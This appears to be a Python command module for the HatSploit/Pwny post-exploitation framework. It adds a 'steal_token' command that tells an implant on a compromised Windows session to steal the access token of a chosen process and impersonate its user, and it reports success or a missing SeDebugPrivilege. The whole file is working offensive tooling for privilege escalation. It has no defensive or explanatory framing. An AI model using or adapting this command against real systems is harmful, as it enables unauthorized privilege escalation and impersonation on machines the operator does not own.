"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

TOKEN_BASE = 21

TOKEN_STEAL = tlv_custom_tag(API_CALL_STATIC, TOKEN_BASE, API_CALL)

TLV_TYPE_TOKEN_USER = tlv_custom_type(TLV_TYPE_STRING, TOKEN_BASE, API_TYPE)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "escalate",
            'Name': "steal_token",
            'Authors': [
                'EntySec - command developer',
            ],
            'Description': "Steal access token from a process and impersonate.",
            'MinArgs': 1,
            'Options': [
                (
                    ('pid',),
                    {
                        'help': "PID of the process to steal token from.",
                        'type': int,
                    }
                ),
            ]
        })

    def run(self, args):
        self.print_process(f"Stealing token from PID {args.pid}...")

        result = self.session.send_command(
            tag=TOKEN_STEAL,
            args={
                TLV_TYPE_PID: args.pid,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Failed to steal token! "
                "Need SeDebugPrivilege or admin context."
            )
            return

        user = result.get_string(TLV_TYPE_TOKEN_USER)
        if user:
            self.print_success(f"Now impersonating: {user}")
        else:
            self.print_success("Token stolen successfully.")
